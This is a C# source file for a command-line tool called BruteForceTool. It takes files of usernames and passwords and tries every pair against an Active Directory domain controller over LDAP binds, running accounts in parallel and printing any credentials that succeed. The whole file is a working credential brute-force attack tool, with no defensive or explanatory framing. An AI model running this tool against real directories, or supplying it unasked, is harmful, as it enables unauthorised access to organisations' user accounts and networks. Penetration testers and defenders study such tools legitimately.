using CommandLine;
using static System.String;
using System;
using System.DirectoryServices.Protocols;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading.Tasks;

namespace BruteForceTool
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            var agrsOptions = new Options();
            if (!Parser.Default.ParseArgumentsStrict(args, agrsOptions))
            {
                Console.WriteLine("Command line arguments are invalid");
                return;
            }

            var authType = GetAuthType(agrsOptions.AuthTypeInput);
            var attemptsCounter = 0;
            var destinationDc = agrsOptions.DestinationDc;
            var domain = destinationDc.Substring(destinationDc.IndexOf('.') + 1);
            if (authType == AuthType.Basic)
                domain = domain.Split('.').First();
            try
            {
                var usersDictionary = File.ReadAllText(agrsOptions.UsersListPath)
                    .Split(new[] {"\r\n"}, StringSplitOptions.None).Select(_ => _.Trim());
                var passwordDictionary = File.ReadAllText(agrsOptions.PasswordListPath)
                    .Split(new[] {"\r\n"}, StringSplitOptions.None);
                Parallel.ForEach(usersDictionary, (user) =>
                {
                    foreach (var pass in passwordDictionary)
                    {
                        if (ValidateCredentials(user, pass, domain, authType, destinationDc))
                        {
                            Console.WriteLine($"Found valid credentials for: {user}, Password: {pass}");
                        }
                    }
                    attemptsCounter++;
                    if(attemptsCounter % 5 == 0)
                        Console.WriteLine($"Attempted {attemptsCounter} accounts...");
                });
            }
            catch (Exception)
            {
                Console.WriteLine("Brute force failed");
            }
        }
        private static string FirstCharToUpper(string input)
        {
            if (IsNullOrEmpty(input))
                throw new ArgumentException("Empty String input");
            return input.First().ToString().ToUpper() + input.Substring(1);
        }
        private static AuthType GetAuthType(string authTypeInput)
        {
            AuthType authType;
            if (!Enum.TryParse(FirstCharToUpper(authTypeInput.ToLower()), out authType))
            {
                authType = AuthType.Basic;
            }
            return authType;
        }
        private static bool ValidateCredentials(string username, string password, string domain, AuthType authType, string destinationDc)
        {
            var credentials
                = new NetworkCredential(username, password, domain);
            using (var connection = new LdapConnection($"{destinationDc}"))
            {
                connection.AuthType = authType;
                connection.SessionOptions.Sealing = true;
                connection.SessionOptions.Signing = true;
                try
                {
                    connection.Bind(credentials);
                }
                catch (LdapException bindException)
                {
                    if(bindException.ErrorCode != 49)
                        Console.WriteLine(bindException);
                    return false;
                }
                return true;
            }
        }
        internal class Options
        {
            [Option('a', "authentication", Required = true,
                HelpText = "Specify the authentication protocol")]
            public string AuthTypeInput { get; set; }
            [Option('d', "destination", Required = true,
                HelpText = "Specify the destination domain controller")]
            public string DestinationDc { get; set; }
            [Option('u', "users", Required = true,
                HelpText = "Specify users dictionary's path.")]
            public string UsersListPath { get; set; }
            [Option('p', "pass", Required = true,
                HelpText = "Specify passwords dictionary's path.")]
            public string PasswordListPath { get; set; }
        }
    }
}